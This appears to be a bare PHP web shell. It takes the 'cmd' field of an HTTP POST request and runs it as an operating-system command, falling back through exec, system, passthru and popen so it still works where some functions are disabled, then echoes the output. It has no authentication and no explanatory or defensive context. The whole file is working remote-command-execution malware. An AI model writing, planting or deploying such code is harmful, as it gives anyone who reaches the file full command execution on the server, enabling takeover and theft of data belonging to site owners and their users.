<?php
function myshellexec($cmd)
{
 global $disablefunc;
 $result = "";
 if (!empty($cmd))
 {
  if (is_callable("exec")) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (is_callable("system")) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable("passthru")) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,"r")))
  {
   $result = "";
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}

$cmdline = $_POST['cmd'];
$ret = myshellexec($cmdline);
echo $ret;
?>